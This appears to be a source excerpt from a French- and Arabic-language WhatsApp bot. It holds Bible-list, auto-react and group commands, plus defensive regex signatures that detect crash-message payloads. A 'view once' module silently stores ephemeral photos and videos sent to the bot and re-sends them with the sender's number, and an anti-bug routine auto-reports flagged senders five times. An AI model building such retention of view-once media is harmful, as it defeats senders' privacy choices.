    'jude': { nom: 'Jude', chapitres: 1, testament: 'Nouveau' },
    'apocalypse': { nom: 'Apocalypse', chapitres: 22, testament: 'Nouveau' }
  };

  const touteLaBible = { ...ancienTestament, ...nouveauTestament };

  // Si aucun argument, afficher le menu
  if (!args[0]) {
    const menuText = `╔═══════════════════════════════════╗
║       📖 𝗟𝗔 𝗦𝗔𝗜𝗡𝗧𝗘 𝗕𝗜𝗕𝗟𝗘       ║
╚═══════════════════════════════════╝

📚 *Utilisation:*
!bible ancien - Ancien Testament (39 livres)
!bible nouveau - Nouveau Testament (27 livres)
!bible liste - Liste complète (66 livres)
!bible [livre] - Info sur un livre

📝 *Exemples:*
!bible genese
!bible matthieu
!bible psaumes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
"La parole de Dieu est vivante"`;

    await sendWithImage(sock, remoteJid, 'bible', menuText);
    return;
  }

  const commande = args[0].toLowerCase();

  // Liste de l'Ancien Testament
  if (commande === 'ancien') {
    let texte = `╔═══════════════════════════════════╗
║   📜 𝗔𝗡𝗖𝗜𝗘𝗡 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧    ║
╚═══════════════════════════════════╝

📚 *39 livres de l'Ancien Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PENTATEUQUE (5):*
1. Genèse (50 ch.)
2. Exode (40 ch.)
3. Lévitique (27 ch.)
4. Nombres (36 ch.)
5. Deutéronome (34 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES HISTORIQUES (12):*
6. Josué (24 ch.)
7. Juges (21 ch.)
8. Ruth (4 ch.)
9. 1 Samuel (31 ch.)
10. 2 Samuel (24 ch.)
11. 1 Rois (22 ch.)
12. 2 Rois (25 ch.)
13. 1 Chroniques (29 ch.)
14. 2 Chroniques (36 ch.)
15. Esdras (10 ch.)
16. Néhémie (13 ch.)
17. Esther (10 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES POÉTIQUES (5):*
18. Job (42 ch.)
19. Psaumes (150 ch.)
20. Proverbes (31 ch.)
21. Ecclésiaste (12 ch.)
22. Cantique des Cantiques (8 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *GRANDS PROPHÈTES (5):*
23. Ésaïe (66 ch.)
24. Jérémie (52 ch.)
25. Lamentations (5 ch.)
26. Ézéchiel (48 ch.)
27. Daniel (12 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PETITS PROPHÈTES (12):*
28. Osée (14 ch.)
29. Joël (3 ch.)
30. Amos (9 ch.)
31. Abdias (1 ch.)
32. Jonas (4 ch.)
33. Michée (7 ch.)
34. Nahum (3 ch.)
35. Habacuc (3 ch.)
36. Sophonie (3 ch.)
37. Aggée (2 ch.)
38. Zacharie (14 ch.)
39. Malachie (4 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste du Nouveau Testament
  if (commande === 'nouveau') {
    let texte = `╔═══════════════════════════════════╗
║   ✝️ 𝗡𝗢𝗨𝗩𝗘𝗔𝗨 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧  ║
╚═══════════════════════════════════╝

📚 *27 livres du Nouveau Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉVANGILES (4):*
1. Matthieu (28 ch.)
2. Marc (16 ch.)
3. Luc (24 ch.)
4. Jean (21 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *HISTOIRE (1):*
5. Actes des Apôtres (28 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES DE PAUL (13):*
6. Romains (16 ch.)
7. 1 Corinthiens (16 ch.)
8. 2 Corinthiens (13 ch.)
9. Galates (6 ch.)
10. Éphésiens (6 ch.)
11. Philippiens (4 ch.)
12. Colossiens (4 ch.)
13. 1 Thessaloniciens (5 ch.)
14. 2 Thessaloniciens (3 ch.)
15. 1 Timothée (6 ch.)
16. 2 Timothée (4 ch.)
17. Tite (3 ch.)
18. Philémon (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES GÉNÉRALES (8):*
19. Hébreux (13 ch.)
20. Jacques (5 ch.)
21. 1 Pierre (5 ch.)
22. 2 Pierre (3 ch.)
23. 1 Jean (5 ch.)
24. 2 Jean (1 ch.)
25. 3 Jean (1 ch.)
26. Jude (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *APOCALYPSE (1):*
27. Apocalypse (22 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste complète
  if (commande === 'liste') {
    let texte = `╔═══════════════════════════════════╗
║     📖 𝗟𝗔 𝗕𝗜𝗕𝗟𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘    ║
╚═══════════════════════════════════╝

📊 *Composition de la Bible:*

📜 Ancien Testament: 39 livres
✝️ Nouveau Testament: 27 livres
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📚 *TOTAL: 66 livres*

💡 *Pour voir la liste détaillée:*
• !bible ancien - Voir les 39 livres
• !bible nouveau - Voir les 27 livres

📖 *Pour info sur un livre:*
• !bible [nom du livre]
• مثال: !bible genese

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ *Quelques statistiques:*
• Plus long livre: Psaumes (150 ch.)
• Plus court: 2 Jean, 3 Jean, Jude (1 ch.)
• Premier livre: Genèse
• Dernier livre: Apocalypse

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
"Toute Écriture est inspirée de Dieu"`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Recherche d'un livre spécifique
  const livreRecherche = commande.toLowerCase().replace(/\s/g, '');
  const livre = touteLaBible[livreRecherche];

  if (livre) {
    const testament = livre.testament === 'Ancien' ? '📜 Ancien Testament' : '✝️ Nouveau Testament';
    const texte = `╔═══════════════════════════════════╗
║        📖 ${livre.nom.toUpperCase()}        ║
╚═══════════════════════════════════╝

${testament}

📊 *Informations:*
• Nombre de chapitres: ${livre.chapitres}
• Testament: ${livre.testament}

💡 *Pour lire ce livre:*
Utilisez votre Bible ou une application
de lecture biblique.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
  } else {
    await sock.sendMessage(remoteJid, {
      text: `❌ Livre "${args[0]}" non trouvé.\n\nUtilisez !bible liste pour voir tous les livres disponibles.`
    });
  }
}

async function handleLeave(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
    return;
  }

  await sock.sendMessage(remoteJid, { 
    text: `\u250C\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2510
Sayonara everyone
\u2514\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2518
\uD83D\uDCA0 _Bot leave. See you soon!_`
  });
  await delay(2000);
  await sock.groupLeave(remoteJid);
}

async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
    return;
  }

  if (args.length === 0) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *Auto-React*\n\nStatut: ${autoReact ? '✅ ON' : '❌ OFF'}\n\n${config.prefix}autoreact on/off\n${config.prefix}autoreact list\n${config.prefix}autoreact add <mot> <emoji>\n${config.prefix}autoreact remove <mot>`
    });
    return;
  }

  const subCommand = args[0].toLowerCase();

  switch (subCommand) {
    case 'on':
      autoReact = true;
      saveData();
      await sock.sendMessage(remoteJid, { text: '✅ Auto-React ACTIVÉ' });
      break;

    case 'off':
      autoReact = false;
      saveData();
      await sock.sendMessage(remoteJid, { text: '❌ Auto-React DÉSACTIVÉ' });
      break;

    case 'list':
      const wordList = Object.entries(autoreactWords)
        .map(([word, emoji]) => `• ${word} → ${emoji}`)
        .join('\n');
      await sock.sendMessage(remoteJid, {
        text: `📝 *Mots*:\n\n${wordList || 'Aucun'}`
      });
      break;

    case 'add':
      if (args.length < 3) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact add <mot> <emoji>`
        });
        return;
      }
      const wordToAdd = args[1].toLowerCase();
      const emojiToAdd = args.slice(2).join(' ');
      autoreactWords[wordToAdd] = emojiToAdd;
      saveData();
      await sock.sendMessage(remoteJid, {
        text: `✅ تمت الإضافة: "${wordToAdd}" → ${emojiToAdd}`
      });
      break;

    case 'remove':
      if (args.length < 2) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact remove <mot>`
        });
        return;
      }
      const wordToRemove = args[1].toLowerCase();
      if (autoreactWords[wordToRemove]) {
        delete autoreactWords[wordToRemove];
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `✅ تم الحذف: "${wordToRemove}"`
        });
      } else {
        await sock.sendMessage(remoteJid, {
          text: `❌ Mot non trouvé`
        });
      }
      break;

    default:
      await sock.sendMessage(remoteJid, {
        text: `❌ Sous-commande inconnue`
      });
  }
}

async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) {
  const sub = args[0]?.toLowerCase();

  // ─── VV (sans argument ou "last") = plusieurs cas ────────────────────────
  if (!sub || sub === 'last') {

    // CAS 1 : L'user répond (!vv en reply) à un message avec média → l'extraire directement
    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (quoted) {
      try {
        let mediaData = null, mediaType = '', mimetype = '', isGif = false;

        // Vérifier si c'est un viewOnce en reply
        const qViewOnce = quoted.viewOnceMessageV2 || quoted.viewOnceMessageV2Extension;
        const qImage    = qViewOnce?.message?.imageMessage || quoted.imageMessage;
        const qVideo    = qViewOnce?.message?.videoMessage || quoted.videoMessage;

        if (qImage) {
          mediaType = 'image'; mimetype = qImage.mimetype || 'image/jpeg';
          const stream = await downloadContentFromMessage(qImage, 'image');
          mediaData = await toBuffer(stream);
        } else if (qVideo) {
          mediaType = 'video'; mimetype = qVideo.mimetype || 'video/mp4';
          isGif = qVideo.gifPlayback || false;
          const stream = await downloadContentFromMessage(qVideo, 'video');
          mediaData = await toBuffer(stream);
        }

        if (mediaData && mediaData.length > 100) {
          await sendVVMedia(sock, remoteJid, {
            type: mediaType, buffer: mediaData, mimetype, isGif, ptt: false,
            timestamp: Date.now(), sender: senderJid, size: mediaData.length, fromJid: senderJid
          }, 1, 1);
          return;
        }
      } catch(e) {
        console.error('[VV reply extract]', e.message);
      }
    }

    // CAS 2 : Chercher dans le cache View Once auto-sauvegardé
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach(item => all.push({ ...item, fromJid: jid }));
    }
    if (all.length === 0) {
      await sock.sendMessage(remoteJid, {
        text: `👁️ *بصمة العين - View Once*

❌ *لا توجد وسائط محفوظة بعد*

📌 *كيف تستخدم هذه الأداة؟*

*الطريقة 1:* أرسل لي صورة أو فيديو بصيغة "Vue Unique" (View Once) وسأحفظها تلقائياً
*الطريقة 2:* رد على أي صورة/فيديو بـ \`!vv\` لاستخراجه مباشرة

📋 *الأوامر:*
• \`!vv\` — آخر وسائط محفوظة
• \`!vv list\` — قائمة كاملة
• \`!vv get 1\` — استرجاع بالرقم`
      });
      return;
    }
    all.sort((a, b) => b.timestamp - a.timestamp);
    await sendVVMedia(sock, remoteJid, all[0], 1, all.length);
    return;
  }

  // ─── VV LIST ────────────────────────────────────────────────────────────────
  if (sub === 'list') {
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach(item => all.push({ ...item, fromJid: jid }));
    }
    all.sort((a, b) => b.timestamp - a.timestamp);

    if (all.length === 0) {
      await sock.sendMessage(remoteJid, {
        text: `👁️ *قائمة View Once*\n\n📭 لا توجد وسائط محفوظة`
      });
      return;
    }

    let listText = `┏━━━  👁️ قائمة View Once  👁️  ━━━┓\n\n`;
    listText += `📦 *إجمالي المحفوظات: ${all.length}*\n\n`;
    all.forEach((item, i) => {
      const date = new Date(item.timestamp).toLocaleString('ar-SA', {
        timeZone: 'America/Port-au-Prince',
        day: '2-digit', month: '2-digit',
        hour: '2-digit', minute: '2-digit'
      });
      const icon = item.type === 'image' ? '📸' : item.type === 'video' ? '🎥' : '🎵';
      const from = item.fromJid.split('@')[0];
      listText += `${icon} *${i + 1}.* من: +${from}\n   📅 ${date}\n   📏 ${(item.size / 1024).toFixed(0)} KB\n\n`;
    });
    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
    listText += `📌 *للاسترجاع:* ${config.prefix}vv get [رقم]\n`;
    listText += `📌 *الأخير:* ${config.prefix}vv last\n`;
    listText += `📌 *الحذف:* ${config.prefix}vv clear\n`;
    listText += `📌 *حذف واحد:* ${config.prefix}vv del [رقم]`;

    await sock.sendMessage(remoteJid, { text: listText });
    return;
  }

  // ─── VV GET <n> ─────────────────────────────────────────────────────────────
  if (sub === 'get') {
    const idx = parseInt(args[1]) - 1;
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach(item => all.push({ ...item, fromJid: jid }));
    }
    all.sort((a, b) => b.timestamp - a.timestamp);

    if (isNaN(idx) || idx < 0 || idx >= all.length) {
      await sock.sendMessage(remoteJid, {
        text: `❌ رقم غير صالح\n\nالاستخدام: ${config.prefix}vv get 1\nالنطاق: 1 - ${all.length}`
      });
      return;
    }

    await sendVVMedia(sock, remoteJid, all[idx], idx + 1, all.length);
    return;
  }

  // ─── VV DEL <n> ─────────────────────────────────────────────────────────────
  if (sub === 'del' && args[1]) {
    const idx = parseInt(args[1]) - 1;
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach((item, i) => all.push({ ...item, fromJid: jid, arrIdx: i }));
    }
    all.sort((a, b) => b.timestamp - a.timestamp);

    if (isNaN(idx) || idx < 0 || idx >= all.length) {
      await sock.sendMessage(remoteJid, {
        text: `❌ رقم غير صالح (1 - ${all.length})`
      });
      return;
    }

    const target = all[idx];
    const userArr = savedViewOnce.get(target.fromJid) || [];
    userArr.splice(target.arrIdx, 1);
    if (userArr.length === 0) savedViewOnce.delete(target.fromJid);
    else savedViewOnce.set(target.fromJid, userArr);
    saveStoreKey('viewonce');

    await sock.sendMessage(remoteJid, {
      text: `✅ تم حذف العنصر #${idx + 1} من القائمة`
    });
    return;
  }

  // ─── VV CLEAR ───────────────────────────────────────────────────────────────
  if (sub === 'clear') {
    const total = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
    savedViewOnce.clear();
    saveStoreKey('viewonce');
    await sock.sendMessage(remoteJid, {
      text: `🗑️ تم حذف جميع الوسائط (${total} ملف)`
    });
    return;
  }

  // ─── VV HELP ────────────────────────────────────────────────────────────────
  await sock.sendMessage(remoteJid, {
    text: `┏━━━  👁️ View Once Help  👁️  ━━━┓

📌 *الأوامر المتاحة:*

👁️ ${config.prefix}vv           → آخر وسائط محفوظة
📋 ${config.prefix}vv list       → قائمة كل الوسائط
📥 ${config.prefix}vv get [n]    → استرجاع بالرقم
🗑️ ${config.prefix}vv del [n]    → حذف بالرقم
🧹 ${config.prefix}vv clear      → حذف الكل
🕐 ${config.prefix}vv last       → الأخير

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📦 المحفوظات: ${[...savedViewOnce.values()].reduce((s,a) => s+a.length, 0)}

✨ يتم الحفظ تلقائياً عند استلام
أي وسائط Vue Unique

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
  });
}

// Envoyer un média VV with infos
async function sendVVMedia(sock, remoteJid, item, num, total) {
  try {
    const date = new Date(item.timestamp).toLocaleString('ar-SA', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    const from = item.fromJid.split('@')[0];
    const caption = `┏━━━  👁️ View Once #${num}/${total}  ━━━┓\n\n📱 من: +${from}\n📅 ${date}\n📏 ${(item.size / 1024).toFixed(0)} KB\n\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;

    if (item.type === 'image') {
      await sock.sendMessage(remoteJid, {
        image: item.buffer,
        caption
      });
    } else if (item.type === 'video') {
      await sock.sendMessage(remoteJid, {
        video: item.buffer,
        caption,
        gifPlayback: item.isGif || false
      });
    } else if (item.type === 'audio') {
      await sock.sendMessage(remoteJid, {
        audio: item.buffer,
        ptt: item.ptt || false,
        mimetype: item.mimetype || 'audio/ogg; codecs=opus'
      });
      await sock.sendMessage(remoteJid, { text: caption });
    }
  } catch (e) {
    console.error('خطأ sendVVMedia:', e);
    await sock.sendMessage(remoteJid, { text: `❌ خطأ في إرسال الوسائط: ${e.message}` });
  }
}

// =============================================
// 🛡️ SYSTÈME ANTI-BUG COMPLET
// =============================================

// Signatures de payloads malveillants connus
const BUG_SIGNATURES = {
  // Caractères arabes crashants (U+0600–U+0605, U+202E RTL, etc.)
  arabicCrash: /[\u0600-\u0605\u200E\u200F\u202A-\u202E\u2066-\u2069]{10,}/,
  // Flood d'emojis (>200 emojis consécutifs)
  emojiFlood: /(\p{Emoji_Presentation}|\p{Extended_Pictographic}){50,}/u,
  // Caractères invisibles en masse (zero-width)
  invisibleChars: /[\u200B-\u200D\uFEFF\u180E\u034F]{20,}/,
  // Zalgo / caractères combinants excessifs
  zalgo: /[\u0300-\u036F\u0489\u1DC0-\u1DFF]{15,}/,
  // Chaînes extrêmement longues (>5000 chars d'un seul message)
  massiveText: null, // géré par longueur
  // Caractères CJK en masse (chinois crashant)
  cjkFlood: /[\u4E00-\u9FFF\u3400-\u4DBF]{200,}/,
  // RTL override massif
  rtlOverride: /\u202E{3,}/,
  // Null bytes / caractères de contrôle
  controlChars: /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{5,}/,
};

// Détection dans le contenu du message (texte + métadonnées)
function detectBugPayload(message, messageText) {
  try {
    // 1. Analyser le texte principal
    const text = messageText || '';

    // Longueur excessive
    if (text.length > 5000) {
      return { type: 'MASSIVE_TEXT', detail: `${text.length} caractères`, severity: 'HIGH' };
    }

    // Vérifier chaque signature
    for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
      if (regex && regex.test(text)) {
        return { type: name.toUpperCase(), detail: 'Payload malveillant détecté', severity: 'HIGH' };
      }
    }

    // 2. Analyser les métadonnées du message (contextInfo malveillant)
    const ctx = message.message?.extendedTextMessage?.contextInfo;
    if (ctx) {
      // Thumbnail URL corrompue
      const extAd = ctx.externalAdReply;
      if (extAd) {
        const title = extAd.title || '';
        const body = extAd.body || '';
        if (title.length > 2000 || body.length > 2000) {
          return { type: 'MALICIOUS_CONTEXT', detail: 'externalAdReply corrompu', severity: 'HIGH' };
        }
        // Vérifier les payloads dans le titre/body
        for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
          if (regex && (regex.test(title) || regex.test(body))) {
            return { type: `CONTEXT_${name.toUpperCase()}`, detail: 'Payload dans contextInfo', severity: 'HIGH' };
          }
        }
      }
    }

    // 3. Détecter les messages viewOnce with contenu malveillant
    const vv = message.message?.viewOnceMessageV2 || message.message?.viewOnceMessageV2Extension;
    if (vv) {
      const innerCtx = vv.message?.extendedTextMessage?.contextInfo?.externalAdReply;
      if (innerCtx?.title?.length > 1000) {
        return { type: 'VIEWONCE_EXPLOIT', detail: 'ViewOnce with payload', severity: 'CRITICAL' };
      }
    }

    // 4. Détecter les stickers malveillants (payload dans webpUrl)
    const sticker = message.message?.stickerMessage;
    if (sticker?.url && sticker.url.length > 500) {
      return { type: 'STICKER_EXPLOIT', detail: 'Sticker with URL suspecte', severity: 'MEDIUM' };
    }

    // 5. Flood de mentions (>20 mentions = attaque)
    const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentions.length > 20) {
      return { type: 'MENTION_FLOOD', detail: `${mentions.length} mentions`, severity: 'HIGH' };
    }

    return null; // Pas de bug détecté
  } catch (e) {
    console.error('خطأ detectBugPayload:', e);
    return null;
  }
}

// Gestion d'une attaque bug détectée
async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugInfo) {
  const senderNum = senderJid.split('@')[0];
  const now = Date.now();

  console.log(`🛡️ [ANTI-BUG] Attaque détectée de ${senderNum} | Type: ${bugInfo.type} | Sévérité: ${bugInfo.severity}`);

  // 1. Supprimer immédiatement le message malveillant
  try {
    await sock.sendMessage(remoteJid, { delete: message.key });
  } catch (e) { /* peut échouer si pas admin groupe */ }

  // 2. Mettre à jour le tracker
  const existing = antiBugTracker.get(senderJid) || { count: 0, firstSeen: now, lastSeen: now, blocked: false, attacks: [] };
  existing.count++;
  existing.lastSeen = now;
  existing.attacks.push({ type: bugInfo.type, detail: bugInfo.detail, severity: bugInfo.severity, timestamp: now });
  antiBugTracker.set(senderJid, existing);

  // 3. Si déjà bloqué, ignorer silencieusement
  if (existing.blocked) {
    console.log(`🛡️ [ANTI-BUG] ${senderNum} déjà bloqué, message supprimé silencieusement`);
    return;
  }

  // 4. Alerte dans le chat
  const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🛡️ أنتي باج - تحذير  🛡️  ━━━┓

${severityEmoji} *تم اكتشاف هجوم بيانات خبيثة!*

📱 المهاجم: @${senderNum}
🔍 نوع الهجوم: ${bugInfo.type}
📊 التفاصيل: ${bugInfo.detail}
⚠️ الخطورة: ${bugInfo.severity}
🔢 عدد المحاولات: ${existing.count}/5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🗑️ تم حذف الرسالة الخبيثة
${existing.count >= 5 ? '🔒 سيتم الحظر الفوري...' : `⚠️ ${5 - existing.count} محاولة(ات) متبقية قبل الحظر`}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
    mentions: [senderJid]
  });

  // 5. Si 5 attaques ou CRITICAL → action immédiate
  if (existing.count >= 5 || bugInfo.severity === 'CRITICAL') {
    existing.blocked = true;
    antiBugTracker.set(senderJid, existing);

    // a. Signaler 5 fois à WhatsApp
    await reportToWhatsApp(sock, senderJid, senderNum, existing.attacks);

    // b. Bloquer le contact
    try {
      await sock.updateBlockStatus(senderJid, 'block');
      console.log(`🛡️ [ANTI-BUG] ${senderNum} bloqué with succès`);
    } catch (e) {
      console.error('خطأ blocage:', e);
    }

    // c. Si groupe → expulser
    if (isGroup) {
      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
        }
      } catch (e) { /* silencieux */ }
    }

    // d. Message de confirmation
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅ تم تنفيذ الحماية  ✅  ━━━┓

☠️ *المهاجم تم التعامل معه:*

📱 الرقم: +${senderNum}
🔒 الحالة: محظور بالكامل

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ تم الإبلاغ عنه لواتساب (5 بلاغات)
✅ تم حظر الاتصال
${isGroup ? '✅ تم طرده من المجموعة' : ''}
✅ تم حذف جميع الرسائل الخبيثة

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *سجل الهجمات:*
${existing.attacks.slice(-3).map((a, i) => `${i + 1}. ${a.type} - ${a.severity}`).join('\n')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
*نظام الحماية من الهجمات - مهمة مكتملة*`,
      mentions: [senderJid]
    });

    // e. Notifier l'admin du bot en privé
    for (const adminJid of config.adminNumbers) {
      try {
        await sock.sendMessage(adminJid, {
          text: `🚨 *تقرير أنتي باج*\n\n☠️ هجوم ${bugInfo.severity} تم إيقافه!\n\n📱 المهاجم: +${senderNum}\n📍 المصدر: ${isGroup ? 'مجموعة' : 'رسالة خاصة'}\n🔍 النوع: ${bugInfo.type}\n🔢 المحاولات: ${existing.count}\n\n✅ تم: حذف + تقرير واتساب + حظر${isGroup ? ' + طرد' : ''}`
        });
      } catch (e) { /* silencieux */ }
    }
  }
}

// Envoyer des signalements à WhatsApp (5 fois)
async function reportToWhatsApp(sock, senderJid, senderNum, attacks) {
  console.log(`📨 [ANTI-BUG] Envoi de 5 signalements pour ${senderNum}...`);

  const reportReasons = [
    'spam',          // Spam
    'inappropriate', // Contenu inapproprié
    'harassment',    // Harcèlement
    'threat',        // Menace
    'other'          // Autre
  ];

  for (let i = 0; i < 5; i++) {
    try {
      // Signalement via l'API Baileys
      await sock.reportJid(senderJid, 'spam');
      console.log(`✅ [ANTI-BUG] Signalement ${i + 1}/5 envoyé`);
      await delay(800); // Délai entre chaque signalement
    } catch (e) {
      // Si reportJid n'existe pas, utiliser sendMessage vers le support WhatsApp
      try {
        await sock.sendMessage('0@s.whatsapp.net', {
          text: `REPORT: +${senderNum} is sending malicious bug payloads. Attack type: ${attacks.map(a => a.type).join(', ')}. Please ban this account.`
        });
        console.log(`✅ [ANTI-BUG] Rapport WhatsApp ${i + 1}/5 envoyé`);
      } catch (e2) {
        console.log(`⚠️ [ANTI-BUG] Signalement ${i + 1}/5 (API indisponible, traité localement)`);
      }
      await delay(500);
    }
  }

  console.log(`✅ [ANTI-BUG] 5 signalements complétés pour ${senderNum}`);
}

// Commande !antibug (toggle + status + liste)
async function handleAntiBugCommand(sock, args, remoteJid, senderJid) {
  const sub = args[0]?.toLowerCase();

  // !antibug list → liste des attaquants détectés
  if (sub === 'list') {
    if (antiBugTracker.size === 0) {
      await sock.sendMessage(remoteJid, {
        text: `🛡️ *قائمة أنتي باج*\n\n✅ لا توجد هجمات مسجلة`
      });
      return;
    }

    let listText = `┏━━━  🛡️ سجل الهجمات  🛡️  ━━━┓\n\n`;
    let i = 1;
    for (const [jid, data] of antiBugTracker.entries()) {
      const num = jid.split('@')[0];
      const date = new Date(data.lastSeen).toLocaleString('ar-SA', { timeZone: 'America/Port-au-Prince' });
      const status = data.blocked ? '🔒 محظور' : `⚠️ ${data.count} تحذير`;
      listText += `${i}. +${num}\n   ${status} | ${data.attacks[0]?.type || '?'}\n   📅 ${date}\n\n`;
      i++;
    }
    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
    listText += `📊 الإجمالي: ${antiBugTracker.size} شخص(أشخاص)`;

    await sock.sendMessage(remoteJid, { text: listText });
    return;
  }

  // !antibug clear → vider le tracker
  if (sub === 'clear') {
    const count = antiBugTracker.size;
    antiBugTracker.clear();
    await sock.sendMessage(remoteJid, {
      text: `🗑️ تم مسح سجل الهجمات (${count} إدخال)`
    });
    return;
  }

  // !antibug unblock <number> → débloquer manuellement
  if (sub === 'unblock' && args[1]) {
    const num = args[1].replace(/[^0-9]/g, '');
    const jid = num + '@s.whatsapp.net';
    try {
      await sock.updateBlockStatus(jid, 'unblock');
      antiBugTracker.delete(jid);
      await sock.sendMessage(remoteJid, {
        text: `✅ تم رفع الحظر عن +${num}`
      });
    } catch (e) {
      await sock.sendMessage(remoteJid, {
        text: `❌ خطأ في رفع الحظر: ${e.message}`
      });
    }
    return;
  }

  // !antibug (sans argument) → toggle ON/OFF
  antiBug = !antiBug;
  saveStoreKey('config');

  const statusEmoji = antiBug ? '✅' : '❌';
  const statusText  = antiBug ? 'مفعّل' : 'معطّل';

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🛡️ أنتي باج  🛡️  ━━━┓

${statusEmoji} *الحالة: ${statusText}*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 *ما يتم اكتشافه:*

☠️ أحرف عربية خبيثة (Crash)
🐛 فيضان رموز تعبيرية (>50)
👻 أحرف غير مرئية (>20)
🌀 نص Zalgo (تشويه)
📏 رسائل ضخمة (>5000 حرف)
🀄 أحرف صينية مكثفة (>200)
↪️ RTL Override متعدد
📌 Mentions فيضان (>20)
🖼️ ContextInfo خبيث
👁️ ViewOnce مع Payload
🎯 Sticker URL مشبوه

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *الإجراء عند الاكتشاف:*

1️⃣ حذف الرسالة فوراً
2️⃣ تحذير في الدردشة
3️⃣ بعد 5 هجمات:
   • 📨 5 بلاغات لواتساب
   • 🔒 حظر الاتصال
   • 🚫 طرد من المجموعة
   • 📲 إشعار المسؤول

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *أوامر إضافية:*

• !antibug list     → سجل الهجمات
• !antibug clear    → مسح السجل
• !antibug unblock [رقم] → رفع الحظر

